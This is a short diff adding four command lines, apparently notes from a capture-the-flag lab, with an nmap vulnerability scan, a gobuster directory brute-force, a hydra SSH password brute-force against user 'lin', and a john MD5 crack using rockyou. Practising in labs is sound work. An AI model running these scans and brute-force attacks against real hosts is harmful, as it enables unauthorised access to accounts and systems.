@@ -1,0 +1,4 @@
+nmap --script vuln 10.10.114.198
+gobuster dir -w /usr/share/dirb/wordlists/small.txt -u http://10.10.223.37
+hydra -l lin -P locks.txt -s 22 -f 10.10.244.156 ssh
+john -format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash1.txt
